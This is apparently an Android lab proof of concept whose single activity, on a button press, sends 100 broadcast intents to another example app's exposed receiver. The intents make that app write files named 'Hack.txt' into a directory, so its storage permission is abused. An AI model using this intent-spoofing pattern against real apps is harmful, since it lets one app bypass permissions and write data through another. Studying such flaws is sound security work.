package com.example.albin.hackwritestorage;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    static final String FILENAME = "NAME";
    static final String FILEPATH = "PATH";
    static final String FILECONTENT = "CONTENT";
    private Button mButtonHack;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mButtonHack = findViewById(R.id.buttonHack);

        mButtonHack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                for(int i = 0; i< 100; i ++){
                    String name = i+"Hack.txt";
                    String content = i + "HACKF";
                    Intent intent = new Intent("com.example.albin.writeexternalstorage.writeStorage");
                    intent.putExtra(FILENAME, name);
                    intent.putExtra(FILEPATH, "DIR2");
                    intent.putExtra(FILECONTENT, content);
                    getApplicationContext().sendBroadcast(intent);
                }




                //Toast toast = new Toast(this, "d");
            }
        });
    }
}
